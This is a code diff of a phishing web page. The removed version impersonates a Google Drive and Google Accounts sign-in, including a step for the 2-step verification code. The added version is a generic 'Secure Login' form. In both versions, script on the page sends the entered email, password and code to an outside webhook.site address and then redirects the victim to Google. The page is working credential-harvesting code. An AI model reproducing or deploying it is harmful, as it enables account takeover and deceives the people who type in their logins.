@@ -3,126 +3,85 @@
 
 <head>
   <meta charset="UTF-8" />
-  <meta property="og:title" content="Google Drive - Secure Document" />
-  <meta property="og:description" content="A secure document has been shared with you. View now." />
-  <meta property="og:image" content="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico" />
-  <title>Sign in – Google Accounts</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
   <style>
     body {
-      background-color: #f1f1f1;
-      font-family: 'Roboto', sans-serif;
-      margin: 0;
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
 
     .container {
-      background-color: #fff;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      background-color: white;
+      padding: 30px;
       border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 22px;
       text-align: center;
-    }
-
-    .logo {
-      width: 75px;
-      margin-bottom: 20px;
-    }
-
-    h1 {
-      font-size: 24px;
-      font-weight: 400;
-      margin-bottom: 20px;
-      color: #202124;
     }
 
     input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #dadce0;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
       border-radius: 4px;
       font-size: 14px;
     }
 
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
+      padding: 10px;
+      background-color: #4285f4;
       color: white;
       border: none;
-      font-weight: bold;
       border-radius: 4px;
-      font-size: 14px;
+      font-size: 16px;
       cursor: pointer;
     }
 
-    .step2, .step3 {
-      display: none;
-    }
-
-    small {
-      display: block;
-      margin-top: 20px;
-      font-size: 12px;
-      color: #5f6368;
+    button:hover {
+      background-color: #3367d6;
     }
   </style>
 </head>
 
 <body>
   <div class="container">
-    <img class="logo" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" />
-    <form onsubmit="return nextStep(event)">
-      <div class="step1">
-        <h1>Sign in</h1>
-        <input type="email" id="email" placeholder="Email or phone" required />
-        <button type="submit">Next</button>
-      </div>
-      <div class="step2">
-        <h1>Welcome</h1>
-        <input type="password" id="password" placeholder="Enter your password" required />
-        <button type="button" onclick="step3()">Sign in</button>
-      </div>
-      <div class="step3">
-        <h1>2-Step Verification</h1>
-        <input type="text" id="otp" placeholder="Enter 6-digit code" required />
-        <button type="button" onclick="sendData()">Verify</button>
-      </div>
-      <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
-    </form>
+    <h2>Secure Login</h2>
+    <input type="email" id="email" placeholder="Email" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button onclick="sendData()">Login</button>
   </div>
 
   <script>
-    function nextStep(e) {
-      e.preventDefault();
-      document.querySelector('.step1').style.display = 'none';
-      document.querySelector('.step2').style.display = 'block';
-    }
-
-    function step3() {
-      document.querySelector('.step2').style.display = 'none';
-      document.querySelector('.step3').style.display = 'block';
-    }
-
     function sendData() {
       const email = document.getElementById('email').value;
-      const pass = document.getElementById('password').value;
-      const otp = document.getElementById('otp').value;
+      const password = document.getElementById('password').value;
+
+      if (!email || !password) {
+        alert("Please fill in all fields.");
+        return;
+      }
 
       fetch("https://webhook.site/#!/view/b48d6922-72c1-4099-9145-c3d4a2150b24", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ email: email, password: pass, otp: otp })
+        body: JSON.stringify({ email: email, password: password })
       }).then(() => {
-        window.location.href = "https://drive.google.com";
+        window.location.href = "https://google.com";
       });
     }
   </script>
